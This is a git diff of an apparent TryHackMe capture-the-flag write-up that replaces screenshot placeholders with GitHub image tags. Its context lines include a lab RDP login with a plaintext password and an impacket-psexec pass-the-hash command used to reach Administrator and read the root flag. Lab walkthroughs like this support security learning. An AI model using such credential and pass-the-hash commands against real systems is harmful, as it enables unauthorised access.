@@ -134,7 +134,7 @@ xfreerdp /v:thm-LABYRINTH-CA /u:SUSANNA_MCKNIGHT /p:'CHANGEME2023!' /cert:ignore
 
 6. Navigate to the desktop and retrieve the user flag.
 
-[SCREEN01]
+<img width="1029" height="799" alt="SCREEN01" src="https://github.com/user-attachments/assets/0eb94ed3-49d7-4278-ae01-58b07dbe0b86" />
 
 ---
 
@@ -196,4 +196,4 @@ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:16ec31963c93240962b7e60
 type C:\Users\Administrator\Desktop\root.txt
 ```
 
-[SCREEN02]
+<img width="991" height="539" alt="SCREEN02" src="https://github.com/user-attachments/assets/db788917-a683-4db4-8c95-7c7a6ec3f32f" />
